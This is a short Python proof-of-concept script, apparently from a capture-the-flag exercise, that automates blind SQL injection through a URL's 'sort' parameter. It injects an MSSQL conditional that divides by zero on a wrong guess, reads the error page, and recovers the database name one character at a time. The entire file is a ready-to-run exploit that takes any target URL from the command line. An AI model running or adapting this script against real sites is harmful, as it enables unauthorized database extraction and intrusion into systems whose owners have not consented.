import requests
import string
import sys
from bs4 import BeautifulSoup


if len(sys.argv) < 2:
	print("[+] python3 poc.py <url>")
	exit()

URL = sys.argv[1]
flag = ''

for i in range(1,200):
	for char in string.printable:
		print(char,end='\r')
		params = {'sort':f"(IIF(ASCII(substring(db_name(),{i},1))={ord(char)}, 1,1/0)"}
		try:
			r = requests.get(URL, params=params)
			if "Error" not in r.text:
				flag += char
				print(flag)
				break
		except Exception as e:
			print(e)